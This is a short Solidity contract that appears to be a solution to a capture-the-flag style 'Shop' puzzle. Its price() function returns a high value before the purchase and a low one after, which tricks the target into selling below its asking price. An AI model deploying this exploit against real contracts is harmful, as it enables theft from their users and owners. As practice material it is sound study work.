// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "./Shop.sol";

error HackFailed();

contract ShopHack {
    Shop private immutable target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
        if (target.price() != 69) revert HackFailed();
    }

    function price() external view returns (uint256) {
        if (!target.isSold()) {
            return 1337;
        }
        return 69;
    }
}
